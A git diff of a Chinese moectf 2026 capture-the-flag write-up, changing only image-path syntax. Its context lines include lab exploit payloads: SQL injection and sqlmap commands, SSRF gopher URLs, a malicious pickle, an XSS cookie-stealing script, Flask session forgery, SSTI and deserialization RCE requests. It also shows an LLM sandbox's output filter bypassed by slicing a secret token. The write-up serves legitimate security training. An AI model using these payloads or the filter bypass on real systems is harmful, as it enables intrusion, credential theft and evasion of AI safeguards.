+![image-20260815165947207](<./media/moectf 2026/image-20260815165947207.png>)
 
-![image-20260815171025651](./media/moectf 2026/image-20260815171025651.png)
+![image-20260815171025651](<./media/moectf 2026/image-20260815171025651.png>)
 
-![image-20260815171043591](./media/moectf 2026/image-20260815171043591.png)
+![image-20260815171043591](<./media/moectf 2026/image-20260815171043591.png>)
 
 先在burp里面查抓取青蛙的响应：
 
@@ -3357,11 +3357,11 @@ flask-unsign \
 
 最后拿到key：
 
-![image-20260819193719350](./media/moectf 2026/image-20260819193719350.png)
+![image-20260819193719350](<./media/moectf 2026/image-20260819193719350.png>)
 
 签名：
 
-![image-20260819192117359](./media/moectf 2026/image-20260819192117359.png)
+![image-20260819192117359](<./media/moectf 2026/image-20260819192117359.png>)
 
 响应：
 
@@ -3378,31 +3378,31 @@ Set-Cookie: frog_session=eyJmcm9ncyI6WzAsMSwyLDMsNCw1LDYsNyw4XX0.aoWV1g.bZ9-UO6L
 {"frogs":[0,1,2,3,4,5,6,7,8],"is_new":false,"rarity":0}
 ```
 
-![image-20260819194833210](./media/moectf 2026/image-20260819194833210.png)
+![image-20260819194833210](<./media/moectf 2026/image-20260819194833210.png>)
 
 ### 古籍翻阅
 
 首先打开该网站就是一堆文件目录，全是404not found，需要先找到真正的flag所在文件，F12里面提供了一堆文件目录，给了一个txt也是所有目录都在里头了，打开瞅一下都是三级目录，尝试找异常的那组，尝试筛选子目录个数：
 
-![image-20260812172934549](./media/moectf 2026/image-20260812172934549.png)
+![image-20260812172934549](<./media/moectf 2026/image-20260812172934549.png>)
 
 发现里面有一个特殊的只有一个文件没有子目录，我们直接去互联网搜一下：
 
-![image-20260812173132961](./media/moectf 2026/image-20260812173132961.png)
+![image-20260812173132961](<./media/moectf 2026/image-20260812173132961.png>)
 
 大概率是这本了，我们查一下：
 
-![image-20260812173517748](./media/moectf 2026/image-20260812173517748.png)
+![image-20260812173517748](<./media/moectf 2026/image-20260812173517748.png>)
 
 应该是个文件穿越的题目，尝试绝对路径读取，经查验，最终
 
 请求：
 
-![image-20260812173940594](./media/moectf 2026/image-20260812173940594.png)
+![image-20260812173940594](<./media/moectf 2026/image-20260812173940594.png>)
 
 响应：
 
-![image-20260812174005605](./media/moectf 2026/image-20260812174005605.png)
+![image-20260812174005605](<./media/moectf 2026/image-20260812174005605.png>)
 
 ### 河湖小盗
 
@@ -3410,25 +3410,25 @@ Set-Cookie: frog_session=eyJmcm9ncyI6WzAsMSwyLDMsNCw1LDYsNyw4XX0.aoWV1g.bZ9-UO6L
 
 想玩一下sqlmap，等会试试，先确认注入点：
 
-![image-20260812175747853](./media/moectf 2026/image-20260812175747853.png)
+![image-20260812175747853](<./media/moectf 2026/image-20260812175747853.png>)
 
-![image-20260812175721501](./media/moectf 2026/image-20260812175721501.png)
+![image-20260812175721501](<./media/moectf 2026/image-20260812175721501.png>)
 
 说明是个数字型注入，后端大概是`SELECT ... FROM ... WHERE id = $id`
 
 判断字段数：
 
-![image-20260812180017501](./media/moectf 2026/image-20260812180017501.png)
+![image-20260812180017501](<./media/moectf 2026/image-20260812180017501.png>)
 
 说明3个字段数
 
 尝试union注入：
 
-![image-20260812180146924](./media/moectf 2026/image-20260812180146924.png)
+![image-20260812180146924](<./media/moectf 2026/image-20260812180146924.png>)
 
 select1、1，2一直到1，2，3，4都没有结果
 
-![image-20260812180337336](./media/moectf 2026/image-20260812180337336.png)
+![image-20260812180337336](<./media/moectf 2026/image-20260812180337336.png>)
 
 ```http
 id=2 and length(database())>10
@@ -3436,13 +3436,13 @@ id=2 and length(database())>10
 
 没有结果了就
 
-![image-20260812180613092](./media/moectf 2026/image-20260812180613092.png)
+![image-20260812180613092](<./media/moectf 2026/image-20260812180613092.png>)
 
 成功注入，回显说明第一列是序号第二列是登记人，第三列是公开科目
 
 查数据库名：
 
-![image-20260812180939524](./media/moectf 2026/image-20260812180939524.png)
+![image-20260812180939524](<./media/moectf 2026/image-20260812180939524.png>)
 
 查表名：
 
@@ -3462,7 +3462,7 @@ id=0 union select 1,group_concat(column_name),3 from information_schema.columns 
 
 拿flag：
 
-![image-20260812181301691](./media/moectf 2026/image-20260812181301691.png)
+![image-20260812181301691](<./media/moectf 2026/image-20260812181301691.png>)
 
 让我们试一下sqlmap！
 
@@ -3470,25 +3470,25 @@ id=0 union select 1,group_concat(column_name),3 from information_schema.columns 
 python sqlmap.py -r D:\phpstudy\1.txt --batch --dbs
 ```
 
-![image-20260812182449612](./media/moectf 2026/image-20260812182449612.png)
+![image-20260812182449612](<./media/moectf 2026/image-20260812182449612.png>)
 
 ```bash
 python sqlmap.py -r D:\phpstudy\1.txt --batch -D past_paper --tables
 ```
 
-![image-20260812182616980](./media/moectf 2026/image-20260812182616980.png)
+![image-20260812182616980](<./media/moectf 2026/image-20260812182616980.png>)
 
 ```bash
 python sqlmap.py -r D:\phpstudy\1.txt --batch -D past_paper -T flag_table --columns
 ```
 
-![image-20260812182721132](./media/moectf 2026/image-20260812182721132.png)
+![image-20260812182721132](<./media/moectf 2026/image-20260812182721132.png>)
 
 ```bash
 python sqlmap.py -r D:\phpstudy\1.txt --batch -D past_paper -T flag_table -C flag --dump
 ```
 
-![image-20260812182819721](./media/moectf 2026/image-20260812182819721.png)
+![image-20260812182819721](<./media/moectf 2026/image-20260812182819721.png>)
 
 ### 熊出没
 
@@ -3508,7 +3508,7 @@ gopher://127.0.0.1:54321/_GET / HTTP/1.0%0d%0a%0d%0a
    >
    >**%0d%0a%0d%0a：**URL 编码后的CRLF（回车换行），两个连续的 CRLF 代表 HTTP 头部结束，服务端接收到后就会立即响应。
 
-![image-20260819205454146](./media/moectf 2026/image-20260819205454146.png)
+![image-20260819205454146](<./media/moectf 2026/image-20260819205454146.png>)
 
 我们把path加到URL再次发送：
 
@@ -3516,17 +3516,17 @@ gopher://127.0.0.1:54321/_GET / HTTP/1.0%0d%0a%0d%0a
 gopher://127.0.0.1:54321/_GET /secret-honey HTTP/1.0%0d%0aHost: 127.0.0.1%0d%0a%0d%0a
 ```
 
-![image-20260819205915436](./media/moectf 2026/image-20260819205915436.png)
+![image-20260819205915436](<./media/moectf 2026/image-20260819205915436.png>)
 
 ### 七狗免费小说
 
 访问flag章：
 
-![image-20260812183415543](./media/moectf 2026/image-20260812183415543.png)
+![image-20260812183415543](<./media/moectf 2026/image-20260812183415543.png>)
 
 应该是一个PHP伪协议的题，得用伪协议把文件以base64的形式读取出来，查看网页源码：
 
-![image-20260812184032656](./media/moectf 2026/image-20260812184032656.png)
+![image-20260812184032656](<./media/moectf 2026/image-20260812184032656.png>)
 
 第一行提到的那几个关键字都被禁了
 
@@ -3552,13 +3552,13 @@ except:
     print(zlib.decompress(b, -zlib.MAX_WBITS))
 ```
 
-![image-20260812185217444](./media/moectf 2026/image-20260812185217444.png)
+![image-20260812185217444](<./media/moectf 2026/image-20260812185217444.png>)
 
 ### 合乎周礼
 
 浏览器访问显示：
 
-![image-20260812190947884](./media/moectf 2026/image-20260812190947884.png)
+![image-20260812190947884](<./media/moectf 2026/image-20260812190947884.png>)
 
 先分别访问获取的响应有：
 
@@ -3622,19 +3622,19 @@ Content-Length: 74
 
 访问flag：
 
-![image-20260812192012323](./media/moectf 2026/image-20260812192012323.png)
+![image-20260812192012323](<./media/moectf 2026/image-20260812192012323.png>)
 
 ### 我爱发明
 
 第一关和第二关都是直接输：
 
-![image-20260819232147556](./media/moectf 2026/image-20260819232147556.png)
+![image-20260819232147556](<./media/moectf 2026/image-20260819232147556.png>)
 
-![image-20260819232321170](./media/moectf 2026/image-20260819232321170.png)
+![image-20260819232321170](<./media/moectf 2026/image-20260819232321170.png>)
 
 第三关打开了之后规则如下：
 
-![image-20260819232525123](./media/moectf 2026/image-20260819232525123.png)
+![image-20260819232525123](<./media/moectf 2026/image-20260819232525123.png>)
 
 要求集齐所有的通过盖章的机械组验收碎片并提交该连接串的sha256结果，在时限时间内如果没有成功提交的话就看不到数据且每次刷新碎片都不一样，我们人工没办法完成只能写脚本赶在结束前跑成功
 
@@ -3701,13 +3701,13 @@ Content-Length: 74
 })();
 ```
 
-![image-20260820010110427](./media/moectf 2026/image-20260820010110427.png)
+![image-20260820010110427](<./media/moectf 2026/image-20260820010110427.png>)
 
 ### 日志系统
 
 看页面是个文件上传漏洞，看看源代码接收什么类型的文件：
 
-![image-20260820114212076](./media/moectf 2026/image-20260820114212076.png)
+![image-20260820114212076](<./media/moectf 2026/image-20260820114212076.png>)
 
 然后题目提供了一个后端服务完整源码，重点看漏洞：
 
@@ -3744,7 +3744,7 @@ with open("evil.pkl", "wb") as f:
     pickle.dump(Evil(), f)
 ```
 
-![image-20260820115305441](./media/moectf 2026/image-20260820115305441.png)
+![image-20260820115305441](<./media/moectf 2026/image-20260820115305441.png>)
 
 恶意代码跑通了，但是因为没有flag这个文件所以失败了，那我们的给定脚本也就定了
 
@@ -3763,19 +3763,19 @@ with open("evil.pkl", "wb") as f:
     pickle.dump(Evil(), f)
 ```
 
-![image-20260820120118857](./media/moectf 2026/image-20260820120118857.png)
+![image-20260820120118857](<./media/moectf 2026/image-20260820120118857.png>)
 
 ### 江洋大盗
 
 还是SQL注入的题，提供了一个黑名单附件，尝试sqlmap失败了，先试试浏览器：
 
-![image-20260812193359868](./media/moectf 2026/image-20260812193359868.png)
+![image-20260812193359868](<./media/moectf 2026/image-20260812193359868.png>)
 
-![image-20260812193503535](./media/moectf 2026/image-20260812193503535.png)
+![image-20260812193503535](<./media/moectf 2026/image-20260812193503535.png>)
 
 空格、注释那些试过之后全被拦了，Union被黑名单拦了，只能无空格布尔盲注：
 
-![image-20260812193856775](./media/moectf 2026/image-20260812193856775.png)
+![image-20260812193856775](<./media/moectf 2026/image-20260812193856775.png>)
 
 逐个提取数据库的名字，共10个字符一个一个尝试，通过
 
@@ -3785,7 +3785,7 @@ with open("evil.pkl", "wb") as f:
 
 第一个字符测出来是p，试试第一题的数据库名past_paper：
 
-![image-20260812194543814](./media/moectf 2026/image-20260812194543814.png)
+![image-20260812194543814](<./media/moectf 2026/image-20260812194543814.png>)
 
 有回显，说明数据库名不变
 
@@ -3896,13 +3896,13 @@ if __name__ == "__main__":
     main()
 ```
 
-![image-20260812202401435](./media/moectf 2026/image-20260812202401435.png)
+![image-20260812202401435](<./media/moectf 2026/image-20260812202401435.png>)
 
 ### 礼崩乐坏
 
 题目打开就是一个配置中心web的服务，页面提供了api的接口：
 
-![image-20260823104010254](./media/moectf 2026/image-20260823104010254.png)
+![image-20260823104010254](<./media/moectf 2026/image-20260823104010254.png>)
 
 然后我们查一下各个接口的描述：
 
@@ -3966,7 +3966,7 @@ if __name__ == "__main__":
 }
 ```
 
-![image-20260823110532875](./media/moectf 2026/image-20260823110532875.png)
+![image-20260823110532875](<./media/moectf 2026/image-20260823110532875.png>)
 
 没有通过，服务器可能把`__proto__`这个词拦了，那我们尝试换个暗号：`constructor.prototype`，我们提交：
 
@@ -4000,7 +4000,7 @@ fetch('/api/me').then(r => r.json()).then(console.log)
 fetch('/api/flag').then(r => r.json()).then(console.log)
 ```
 
-![image-20260823111149826](./media/moectf 2026/image-20260823111149826.png)
+![image-20260823111149826](<./media/moectf 2026/image-20260823111149826.png>)
 
 ### bblogin
 
@@ -4033,7 +4033,7 @@ def login():
 username={{config}}&password=123
 ```
 
-![image-20260820122141783](./media/moectf 2026/image-20260820122141783.png)
+![image-20260820122141783](<./media/moectf 2026/image-20260820122141783.png>)
 
 然后用`flask-unsign`伪造session：
 
@@ -4041,7 +4041,7 @@ username={{config}}&password=123
 flask-unsign --sign --secret "4c02a8db7cd8dd5183fd1d6501ab5136d3f593721541e72ad776e0327f13d06c" --cookie '{"token":"admin"}'
 ```
 
-![image-20260820122437180](./media/moectf 2026/image-20260820122437180.png)
+![image-20260820122437180](<./media/moectf 2026/image-20260820122437180.png>)
 
 然后在浏览器F12的控制台设置cookie并发送：
 
@@ -4050,13 +4050,13 @@ document.cookie = "session=eyJ0b2tlbiI6ImFkbWluIn0.aoaBeg.Y_zsPJKvqavKOQjBetRam9
 location.href = "/userInfo.html";
 ```
 
-![image-20260820123257465](./media/moectf 2026/image-20260820123257465.png)
+![image-20260820123257465](<./media/moectf 2026/image-20260820123257465.png>)
 
 ### 我刚一提交就发现了三个问题
 
 题目提示说：（尝试提交内容为题目描述的文本文件会有惊喜，不包含括号内容，注意消除行间空格）我们把题目描述保存成txt文本提交上去输出：
 
-![image-20260823231737085](./media/moectf 2026/image-20260823231737085.png)
+![image-20260823231737085](<./media/moectf 2026/image-20260823231737085.png>)
 
 访问该路径发现返回了文本内容，没有什么别的提示，然后我上传php文件被系统删除了，然后就开始排查：
 
@@ -4111,7 +4111,7 @@ if not hit["found"]:
     print("[-] 30秒内未命中，可能窗口太小或删除是同步的")
 ```
 
-![image-20260824111328136](./media/moectf 2026/image-20260824111328136.png)
+![image-20260824111328136](<./media/moectf 2026/image-20260824111328136.png>)
 
 ### 旧能源管理系统
 
@@ -4204,7 +4204,7 @@ username={{ url_for.__globals__['current_app'].view_functions['index'].__globals
 })();
 ```
 
-![image-20260825205725586](./media/moectf 2026/image-20260825205725586.png)
+![image-20260825205725586](<./media/moectf 2026/image-20260825205725586.png>)
 
 发现flag以环境变量形式存在，那我们就可以爆破环境变量逐字求flag了：
 
@@ -4274,7 +4274,7 @@ username={{ url_for.__globals__['current_app'].view_functions['index'].__globals
 })();
 ```
 
-![image-20260825212645907](./media/moectf 2026/image-20260825212645907.png)
+![image-20260825212645907](<./media/moectf 2026/image-20260825212645907.png>)
 
 ### 黑市走私
 
@@ -4286,7 +4286,7 @@ username={{ url_for.__globals__['current_app'].view_functions['index'].__globals
 
  网站页面提示找引路人，访问页面看看：
 
-![image-20260820191345515](./media/moectf 2026/image-20260820191345515.png)
+![image-20260820191345515](<./media/moectf 2026/image-20260820191345515.png>)
 
 解码payload用base64就能得到`{"sub":"traveler","role":"guest","scope":"read"}`
 
@@ -4307,7 +4307,7 @@ for w in words:
         pass
 ```
 
-![image-20260822173343772](./media/moectf 2026/image-20260822173343772.png)
+![image-20260822173343772](<./media/moectf 2026/image-20260822173343772.png>)
 
 然后我们伪造admin JWT：
 
@@ -4426,7 +4426,7 @@ flag2 = extract_flag(data2)
 print(f"{flag2}")
 ```
 
-![image-20260824111253365](./media/moectf 2026/image-20260824111253365.png)
+![image-20260824111253365](<./media/moectf 2026/image-20260824111253365.png>)
 
 ### 七狗收费小说
 
@@ -4434,11 +4434,11 @@ print(f"{flag2}")
 
 说明这可能是个.git目录泄露，我们使用`git-dumper`工具从目标网站下载 `.git` 目录：
 
-![image-20260821153136465](./media/moectf 2026/image-20260821153136465.png)
+![image-20260821153136465](<./media/moectf 2026/image-20260821153136465.png>)
 
 拉取到唯一源码文件：
 
-![image-20260821153251659](./media/moectf 2026/image-20260821153251659.png)
+![image-20260821153251659](<./media/moectf 2026/image-20260821153251659.png>)
 
 ```php
 class User
@@ -4586,7 +4586,7 @@ PAYLOAD=$(php make_payload.php | tail -n 1)
 curl -s -H "Cookie: user=$PAYLOAD" http://172.31.224.1:61063/
 ```
 
-![image-20260821155823445](./media/moectf 2026/image-20260821155823445.png)
+![image-20260821155823445](<./media/moectf 2026/image-20260821155823445.png>)
 
 ### 巧乐兹
 
@@ -4708,7 +4708,7 @@ curl -sS "$BASE/api/v1/metrics"
 curl -sS "$BASE/api/v1/log"
 ```
 
-![image-20260824123853334](./media/moectf 2026/image-20260824123853334.png)
+![image-20260824123853334](<./media/moectf 2026/image-20260824123853334.png>)
 
 然后首次验证RCE：
 
@@ -4718,11 +4718,11 @@ curl -i -X PUT "$BASE/api/v1/notes" \
   --data-raw '{"@type":"com.example.demo.dto.MetricDTO","key":"probe","valueByCommand":"id"}'
 ```
 
-![image-20260824123718944](./media/moectf 2026/image-20260824123718944.png)
+![image-20260824123718944](<./media/moectf 2026/image-20260824123718944.png>)
 
 返回HTTP500查看日志：
 
-![image-20260824123929018](./media/moectf 2026/image-20260824123929018.png)
+![image-20260824123929018](<./media/moectf 2026/image-20260824123929018.png>)
 
 说明命令已执行且是root命令，然后直接读取flag：
 
@@ -4733,13 +4733,13 @@ curl -X PUT "$BASE/api/v1/notes" \
 curl -sS "$BASE/api/v1/log"
 ```
 
-![image-20260824124043764](./media/moectf 2026/image-20260824124043764.png)
+![image-20260824124043764](<./media/moectf 2026/image-20260824124043764.png>)
 
 ### Moe论坛
 
 随便注册一个用户登进去就跳出来一堆访问记录然后查看cookie：
 
-![image-20260824163813684](./media/moectf 2026/image-20260824163813684.png)
+![image-20260824163813684](<./media/moectf 2026/image-20260824163813684.png>)
 
 看起来像加密签名后的值，我们先测试XSS，发帖：
 
@@ -4751,13 +4751,13 @@ XSS确认成功，我们现在要偷cookie，尝试让管理员自己发cookie�
 <script>fetch('/new_post.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=COOKIE_'+Date.now()+'&content='+encodeURIComponent(document.cookie)});</script>
 ```
 
-![image-20260824165007674](./media/moectf 2026/image-20260824165007674.png)
+![image-20260824165007674](<./media/moectf 2026/image-20260824165007674.png>)
 
-![image-20260824210811878](./media/moectf 2026/image-20260824210811878.png)
+![image-20260824210811878](<./media/moectf 2026/image-20260824210811878.png>)
 
 拿到管理员的cookie后我们用该cookie登进去拿到管理员权限：
 
-![image-20260824170839749](./media/moectf 2026/image-20260824170839749.png)
+![image-20260824170839749](<./media/moectf 2026/image-20260824170839749.png>)
 
 拿到管理员权限后我们在后台渲染后的HTML里可以看到上传表单：
 
@@ -4989,7 +4989,7 @@ for page in range(1,8):
 '@ | python -
 ```
 
-![image-20260825231109189](./media/moectf 2026/image-20260825231109189.png)
+![image-20260825231109189](<./media/moectf 2026/image-20260825231109189.png>)
 
 然后我们访问文件确认执行：
 
@@ -5005,11 +5005,11 @@ print(r.text[:5000])
 '@ | python -
 ```
 
-![image-20260825231212760](./media/moectf 2026/image-20260825231212760.png)
+![image-20260825231212760](<./media/moectf 2026/image-20260825231212760.png>)
 
 拿到文件路径，但是我们还不能直接读flag因为权限不够我们查到flag的文件及权限是：
 
-![image-20260825231421843](./media/moectf 2026/image-20260825231421843.png)
+![image-20260825231421843](<./media/moectf 2026/image-20260825231421843.png>)
 
 通过 `.phtml` 枚举进程，发现管理员 bot 和 ChromeDriver 都是 root,我们可以让root Chrome 访问：`file:///f139`从而读取系统文件
 
@@ -5123,7 +5123,7 @@ echo "OUT=/fileadmin/user_upload/cd_out_$id.txt\n";
 ?>
 ```
 
-![image-20260825231919121](./media/moectf 2026/image-20260825231919121.png)
+![image-20260825231919121](<./media/moectf 2026/image-20260825231919121.png>)
 
 然后我们读取探针结果：
 
@@ -5153,25 +5153,25 @@ for i in range(36):
 '@ | python -
 ```
 
-![image-20260825232046412](./media/moectf 2026/image-20260825232046412.png)
+![image-20260825232046412](<./media/moectf 2026/image-20260825232046412.png>)
 
 ## 开发与运维基础
 
 ### 当 Nginx 不在
 
-![image-20260809201145965](./media/moectf 2026/image-20260809201145965.png)
+![image-20260809201145965](<./media/moectf 2026/image-20260809201145965.png>)
 
 题目提及关键词等待3000端口打印数据，用nc连3000端口：
 
-![image-20260809201341171](./media/moectf 2026/image-20260809201341171.png)
+![image-20260809201341171](<./media/moectf 2026/image-20260809201341171.png>)
 
 flag出来了：
 
-![image-20260809201419222](./media/moectf 2026/image-20260809201419222.png)
+![image-20260809201419222](<./media/moectf 2026/image-20260809201419222.png>)
 
 拼接得：
 
-![image-20260809201444894](./media/moectf 2026/image-20260809201444894.png)
+![image-20260809201444894](<./media/moectf 2026/image-20260809201444894.png>)
 
 ### 网站日志取证大师
 
@@ -5189,7 +5189,7 @@ flag出来了：
 grep "/wp-json/wp/v2/users/me" accesslog_4.log | awk -F '|' '{print $2}' | sed 's/^[ \t]*//;s/[ \t]*$//' | grep -v '^-$' | sort -u | wc -l
 ```
 
-![image-20260812115755619](./media/moectf 2026/image-20260812115755619.png)
+![image-20260812115755619](<./media/moectf 2026/image-20260812115755619.png>)
 
 2.扫描工具名称与版本号：
 
@@ -5201,7 +5201,7 @@ grep "185.177.72.68" accesslog_4.log | awk -F '|' '{print $9}' | sort -u
 
 发现输出了两个不同User-Agent：Mozilla/5.0和curl/8.7.1，我们需要进一步排查：
 
-![image-20260812121123809](./media/moectf 2026/image-20260812121123809.png)
+![image-20260812121123809](<./media/moectf 2026/image-20260812121123809.png>)
 
 从输出的日志末尾看，极高频的漏洞扫描和测试用的都是curl/8.7.1因此确定扫描工具及版本号为curl/8.7.1
 
@@ -5211,11 +5211,11 @@ grep "185.177.72.68" accesslog_4.log | awk -F '|' '{print $9}' | sort -u
 
 总扫描次数：
 
-![image-20260812120804070](./media/moectf 2026/image-20260812120804070.png)
+![image-20260812120804070](<./media/moectf 2026/image-20260812120804070.png>)
 
 因此拼接flag：
 
-![image-20260812121413682](./media/moectf 2026/image-20260812121413682.png)
+![image-20260812121413682](<./media/moectf 2026/image-20260812121413682.png>)
 
 ### 运维入门指北_revenge
 
@@ -5239,9 +5239,9 @@ ls -l /run/php/
 
 发现socket的版本不一致：
 
-![image-20260819101220402](./media/moectf 2026/image-20260819101220402.png)
+![image-20260819101220402](<./media/moectf 2026/image-20260819101220402.png>)
 
-![image-20260819101246481](./media/moectf 2026/image-20260819101246481.png)
+![image-20260819101246481](<./media/moectf 2026/image-20260819101246481.png>)
 
 修改配置使socket一致：
 
@@ -5258,11 +5258,11 @@ curl -I http://127.0.0.1:8080/
 curl -s http://127.0.0.1:8080/ | head -40
 ```
 
-![image-20260818233518773](./media/moectf 2026/image-20260819101427906.png)
+![image-20260818233518773](<./media/moectf 2026/image-20260819101427906.png>)
 
 站点从404变成了302，通了，浏览器访问尝试安装软件：
 
-![](./media/moectf 2026/屏幕截图 2026-08-18 233322.png)
+![](<./media/moectf 2026/屏幕截图 2026-08-18 233322.png>)
 
 权限不足，ssh加权：
 
@@ -5275,13 +5275,13 @@ chmod 755 /var/www/html/usr/uploads
 sudo chown -R www-data:www-data /var/www/html/usr
 ```
 
-![image-20260818233601337](./media/moectf 2026/image-20260818233601337.png)
+![image-20260818233601337](<./media/moectf 2026/image-20260818233601337.png>)
 
-![image-20260819012119515](./media/moectf 2026/image-20260819012119515.png)
+![image-20260819012119515](<./media/moectf 2026/image-20260819012119515.png>)
 
-![image-20260818233906276](./media/moectf 2026/image-20260818233906276.png)
+![image-20260818233906276](<./media/moectf 2026/image-20260818233906276.png>)
 
-![image-20260818235351126](./media/moectf 2026/image-20260818235351126.png)
+![image-20260818235351126](<./media/moectf 2026/image-20260818235351126.png>)
 
 博客装好了之后ssh里查最新文章：
 
@@ -5289,7 +5289,7 @@ sudo chown -R www-data:www-data /var/www/html/usr
 mysql -u moectf -pxdsec -h 127.0.0.1 -P 3306 -e "USE blog; SELECT cid,title,slug FROM typecho_contents ORDER BY cid DESC LIMIT 5;"
 ```
 
-![image-20260819101858839](./media/moectf 2026/image-20260819101858839.png)
+![image-20260819101858839](<./media/moectf 2026/image-20260819101858839.png>)
 
 取`moectf-flag-2026`的正文：
 
@@ -5297,7 +5297,7 @@ mysql -u moectf -pxdsec -h 127.0.0.1 -P 3306 -e "USE blog; SELECT cid,title,slug
 mysql -u moectf -pxdsec -h 127.0.0.1 -P 3306 -e "USE blog; SELECT cid,title,text FROM typecho_contents WHERE slug='moectf-flag-2026'\G"
 ```
 
-![image-20260819102016371](./media/moectf 2026/image-20260819102016371.png)
+![image-20260819102016371](<./media/moectf 2026/image-20260819102016371.png>)
 
 ### 代号：碎片风暴
 
@@ -5410,7 +5410,7 @@ scp传代码：
 scp -P 33186 wp.py moectf@127.0.0.1:/home/moectf/
 ```
 
-![image-20260819103640277](./media/moectf 2026/image-20260819103640277.png)
+![image-20260819103640277](<./media/moectf 2026/image-20260819103640277.png>)
 
 ## 大语言模型应用安全
 
@@ -5426,7 +5426,7 @@ print(len(SESSION_TOKEN))
 print("SESSION_TOKEN" in globals())
 ```
 
-![image-20260813114359524](./media/moectf 2026/image-20260813114359524.png)
+![image-20260813114359524](<./media/moectf 2026/image-20260813114359524.png>)
 
 尝试直接打印：
 
@@ -5434,7 +5434,7 @@ print("SESSION_TOKEN" in globals())
 print(SESSION_TOKEN)
 ```
 
-![image-20260813114626881](./media/moectf 2026/image-20260813114626881.png)
+![image-20260813114626881](<./media/moectf 2026/image-20260813114626881.png>)
 
 说明变量就在当前环境里做了部分替换导致无法输出（过滤了）继续尝试：
 
@@ -5446,17 +5446,17 @@ print(SESSION_TOKEN.encode())
 print(SESSION_TOKEN.hex())
 ```
 
-![image-20260813115128401](./media/moectf 2026/image-20260813115128401.png)
+![image-20260813115128401](<./media/moectf 2026/image-20260813115128401.png>)
 
 那还说啥了，切片输出：
 
-![image-20260813123915222](./media/moectf 2026/image-20260813123915222.png)
+![image-20260813123915222](<./media/moectf 2026/image-20260813123915222.png>)
 
 ### 旮旯给木里就是这样的！
 
 这道题主要是要集齐5个信物，通过触发关键词，而且必须在心动值满之前，信任值过半的情况下才能过终章
 
-![image-20260820135721863](./media/moectf 2026/image-20260820135721863.png)
+![image-20260820135721863](<./media/moectf 2026/image-20260820135721863.png>)
 
 既然是ctf比赛肯定不能完完全全瞎猜，源码肯定有提示，但是源码把一些重要的中文自动编码了，我也一直没发现然后在那碰，我们可以在控制台输入：
 
@@ -5466,11 +5466,11 @@ console.log(JSON.stringify(BOOT, null, 2))
 
 显示中文出来：
 
-![image-20260822102859600](./media/moectf 2026/image-20260822102859600.png)
+![image-20260822102859600](<./media/moectf 2026/image-20260822102859600.png>)
 
 五个记忆碎片出来了，圆滑一下话术即可，然后就是想办法聊天集好感度和信赖值的事情这倒没啥：
 
-![image-20260822003958382](./media/moectf 2026/image-20260822003958382.png)
+![image-20260822003958382](<./media/moectf 2026/image-20260822003958382.png>)
 
 ## 取证与安全杂项
 
@@ -5483,7 +5483,7 @@ binary_str = "01101101 01101111 01100101 01100011 01110100 01100110 01111011 010
 print(''.join(chr(int(b, 2)) for b in binary_str.split()))
 ```
 
-![image-20260813132636689](./media/moectf 2026/image-20260813132636689.png)
+![image-20260813132636689](<./media/moectf 2026/image-20260813132636689.png>)
 
 ### Tomato
 
@@ -5563,7 +5563,7 @@ print("done -> decoded.png")
 
 运行结果：
 
-![decoded](./media/moectf 2026/decoded.png)
+![decoded](<./media/moectf 2026/decoded.png>)
 
 尝试了十几次之后最终确定flag：`moectf{Tom@t0_i5_D3lic1ou5!}`
 
@@ -5577,13 +5577,13 @@ s="=0HN2U0cAJ2XudHMut2XzYHQo9Vdwk1emR3Yl9Wb"
 print(base64.b64decode(s[::-1]).decode())
 ```
 
-![image-20260813144035084](./media/moectf 2026/image-20260813144035084.png)
+![image-20260813144035084](<./media/moectf 2026/image-20260813144035084.png>)
 
 ### ez_LSB
 
 一个图片隐写题，尝试各种隐写工具包括但不限于file、strings、exiftool、binwalk、foremost、steghide，最终通过zsteg（专门针对PNG/BMP的LSB隐写检测工具）成功找到flag：
 
-![image-20260813150942783](./media/moectf 2026/image-20260813150942783.png)
+![image-20260813150942783](<./media/moectf 2026/image-20260813150942783.png>)
 
 估摸是一个base64解码，测：
 
@@ -5593,7 +5593,7 @@ s = "bW9lY3Rme2M0N19rTjBXNV9MU0J9"
 print(base64.b64decode(s).decode())
 ```
 
-![image-20260813151037513](./media/moectf 2026/image-20260813151037513.png)
+![image-20260813151037513](<./media/moectf 2026/image-20260813151037513.png>)
 
 ### 星走路的旅程-level1
 
@@ -5605,15 +5605,15 @@ exiftool level1.jpg
 
 GPS坐标：
 
-![image-20260813153112542](./media/moectf 2026/image-20260813153112542.png)
+![image-20260813153112542](<./media/moectf 2026/image-20260813153112542.png>)
 
 对应贵阳龙洞堡国际机场，其 IATA 代码为 KWE
 
-![image-20260813152955676](./media/moectf 2026/image-20260813152955676.png)
+![image-20260813152955676](<./media/moectf 2026/image-20260813152955676.png>)
 
 拍摄时间：
 
-![image-20260813153320515](./media/moectf 2026/image-20260813153320515.png)
+![image-20260813153320515](<./media/moectf 2026/image-20260813153320515.png>)
 
 时区偏移+08：00，对应10:03:21 - 08:00 = 02:03:21
 
@@ -5629,7 +5629,7 @@ calc_md5 = hashlib.md5(flag.encode('utf-8')).hexdigest()
 print(calc_md5 == target_md5)
 ```
 
-![image-20260813153701239](./media/moectf 2026/image-20260813153701239.png)
+![image-20260813153701239](<./media/moectf 2026/image-20260813153701239.png>)
 
 ### 空白文档
 
@@ -5652,7 +5652,7 @@ strings word/document.xml | head -100
 
 里面出来一串很突出的字符串：
 
-![image-20260813155617321](./media/moectf 2026/image-20260813155617321.png)
+![image-20260813155617321](<./media/moectf 2026/image-20260813155617321.png>)
 
 看到字符串先往base64联想，再结合前面看到的key写脚本（先base64解码再循环异或）：
 
@@ -5667,7 +5667,7 @@ for i, b in enumerate(cipher):
 print(plain.decode())
 ```
 
-![image-20260813155812743](./media/moectf 2026/image-20260813155812743.png)
+![image-20260813155812743](<./media/moectf 2026/image-20260813155812743.png>)
 
 ### Can_you_find_it?
 
@@ -5685,7 +5685,7 @@ cd can_you_find_it
 grep -RaiE 'flag|moectf|find|xing|clover|ow[oO]|ubuntu' . 2>/dev/null | head -100
 ```
 
-![image-20260824103036013](./media/moectf 2026/image-20260824103036013.png)
+![image-20260824103036013](<./media/moectf 2026/image-20260824103036013.png>)
 
 搜出来一个PNG变成的log文件，我们需要找到日志文件具体藏在哪个层：
 
@@ -5696,7 +5696,7 @@ for f in blobs/sha256/*; do
 done
 ```
 
-![image-20260824103444674](./media/moectf 2026/image-20260824103444674.png)
+![image-20260824103444674](<./media/moectf 2026/image-20260824103444674.png>)
 
 然后我们尝试提取png文件：
 
@@ -5704,13 +5704,13 @@ done
